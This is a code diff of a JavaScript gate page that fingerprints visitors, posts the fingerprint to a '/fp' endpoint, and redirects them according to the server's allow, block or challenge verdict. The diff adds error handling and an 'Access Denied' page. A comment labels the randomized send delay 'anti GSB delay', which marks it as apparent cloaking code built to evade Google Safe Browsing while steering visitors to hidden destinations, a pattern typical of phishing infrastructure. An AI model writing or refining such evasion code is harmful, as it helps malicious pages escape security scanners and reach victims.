@@ -1,7 +1,3 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script>
 
 let startTime = Date.now();
@@ -87,48 +83,116 @@ async function sendFP() {
   const data = buildData();
   const params = new URLSearchParams(window.location.search);
 
-  const res = await fetch("/fp", {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-      fp: data,
-      dl: params.get("dl"),
-      bl: params.get("bl"),
-      verified: false
-    })
-  });
+  let res;
+  try {
+    res = await fetch("/fp", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        fp: data,
+        dl: params.get("dl"),
+        bl: params.get("bl"),
+        verified: false
+      })
+    });
+  } catch (err) {
+    console.error("Request failed:", err);
+    showErrorPage();
+    return;
+  }
 
-  const r = await res.json();
-  
-  if ((r.action === "allow" || r.action === "block") && r.redirect) {
+  let r;
+  try {
+    r = await res.json();
+  } catch (err) {
+    console.error("JSON parse failed:", err);
+    showErrorPage();
+    return;
+  }
+
+  if (!r.action) {
+    console.warn("Invalid response:", r);
+    showErrorPage();
+    return;
+  }
+
+  if (r.action === "allow" && r.redirect) {
+    window.location = r.redirect;
+  } else if (r.action === "block" && r.redirect) {
     window.location = r.redirect;
   } else if (r.action === "challenge") {
     showChallenge(r.challengeID, params.get("dl"), params.get("bl"));
   } else {
-    window.location = "https://google.com";
+    console.warn("Unknown action:", r.action);
+    showErrorPage();
   }
+}
+
+function showErrorPage() {
+  document.body.innerHTML = "";
+  document.body.style.display = "flex";
+  document.body.style.justifyContent = "center";
+  document.body.style.alignItems = "center";
+  document.body.style.height = "100vh";
+  document.body.style.margin = "0";
+  document.body.style.backgroundColor = "#fff5f5";
+
+  const div = document.createElement("div");
+  div.style.textAlign = "center";
+  div.style.padding = "40px";
+  div.style.backgroundColor = "white";
+  div.style.borderRadius = "8px";
+  div.style.boxShadow = "0 2px 10px rgba(0,0,0,0.1)";
+
+  div.innerHTML = `
+    <h2 style="color: #dc3545;">Access Denied</h2>
+    <p>Cannot verify your access. Please refresh the page.</p>
+    <button onclick="location.reload()" style="padding: 10px 20px; margin-top: 20px;">Retry</button>
+  `;
+
+  document.body.appendChild(div);
 }
 
 async function completeChallenge(challengeID, dl, bl) {
   const data = buildData();
-  const res = await fetch("/fp", {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-      fp: data,
-      dl: dl,
-      bl: bl,
-      verified: true
-    })
-  });
+  let res;
+  try {
+    res = await fetch("/fp", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        fp: data,
+        dl: dl,
+        bl: bl,
+        verified: true
+      })
+    });
+  } catch (err) {
+    console.error("Challenge request failed:", err);
+    showErrorPage();
+    return;
+  }
 
-  const r = await res.json();
-  if ((r.action === "allow" || r.action === "block") && r.redirect) {
+  let r;
+  try {
+    r = await res.json();
+  } catch (err) {
+    console.error("Challenge JSON parse failed:", err);
+    showErrorPage();
+    return;
+  }
+
+  if (!r.action) {
+    showErrorPage();
+    return;
+  }
+
+  if (r.action === "allow" && r.redirect) {
     window.location = r.redirect;
-  } else if (r.action === "allow") {
-    window.location = "https://google.com";
+  } else if (r.action === "block" && r.redirect) {
+    window.location = r.redirect;
   } else {
-    window.location = "https://google.com";
+    showErrorPage();
   }
 }
 
@@ -170,7 +234,7 @@ function showChallenge(challengeID, dl, bl) {
 }
 
 // anti GSB delay and allow for basic human interaction capture
-setTimeout(() => {
+timeoutId = setTimeout(() => {
   sendFP();
 }, 1200 + Math.random() * 400);
 
